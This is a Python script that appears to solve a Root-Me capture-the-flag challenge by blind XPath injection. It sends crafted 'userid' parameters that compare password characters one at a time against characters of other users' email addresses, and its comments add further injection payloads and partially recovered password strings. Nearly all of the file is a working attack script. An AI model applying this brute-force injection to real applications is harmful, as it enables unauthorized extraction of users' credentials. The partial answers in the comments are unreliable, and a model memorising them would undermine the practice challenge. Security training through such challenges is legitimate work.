import requests
import sys
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import string


def requests_retry_session(
    retries=10,
    backoff_factor=0.3,
    status_forcelist=(500, 502, 504),
    session=None
):
  session = session or requests.Session()
  retry = Retry(
      total=retries,
      read=retries,
      connect=retries,
      backoff_factor=backoff_factor,
      status_forcelist=status_forcelist,
  )
  adapter = HTTPAdapter(max_retries=retry)
  session.mount('http://', adapter)
  session.mount('https://', adapter)
  return session

url = "http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=111111] | //user[2][userid=2 and substring(//user[2]/password,"
payload0 = ",1)=substring(//user["
payload1 = "]/email,"
payload2 = ",1) ] | //user[userid=111111"

char = "efkpqwxABCDFGHIKLMNOPQRTUVWXYZ0123456789_/,!$^&+()_-+[]{};`:\"\\<>?|"
# char = string.ascii_letters + string.digits + "_/.,!@#$^&+()_-+[]{};`:\"\\<>/?|"


for u in range(1,14):
  for user in range(1,6):
    for i in range(1,19):
      # print url+str(u)+payload0+str(user)+payload1+str(i)+payload2 """ turn it on if you want to track your url """
      r = requests_retry_session().get(url+str(u)+",1)=substring(//user["+str(user)+"]/email,"+str(i)+",1) ] | //user[userid=111111")
      sys.stdout.write('.')
      sys.stdout.flush()
      if "John" in r.content:
        print "pass char "+str(u)+" equal to username: "+str(user)+" pos: "+str(i)
        break

# for u in range(1, 14):
#   for i in range(0, 10):
#     # print url+str(u)+",1)="+str(i)+"] | //user[userid=11111"
#     r = requests_retry_session().get(url + str(u) + ",1)=" +
#                                      str(i) + "] | //user[userid=111111")

#     if "John" in r.content:
#       print "pass char " + str(u) + " equal to number: " + str(i)
#       break

# http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=
# http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=1 and string-length(/user[2]/password/text())>1 ]| //user[userid=2
# 111111] | //user[1][userid=1 and substring(//user[2]/password,13,1)="S" ] | //user[userid=111111

# 111111] | //user[1][userid=1 and substring(//user[2]/password,2,1)=codepoints-to-string(101) ] | //user[userid=111111
# 111111] | //user[1][userid=1 and substring(//user[2]/password,13,1)=substring(//user[1]/email,1,1)] | //user[userid=111111
# eee4i65i1JJoS
# eeeiiJJ   oS
# ueiJ4a65.1.o

# eiJ4a65@1.oS
# test456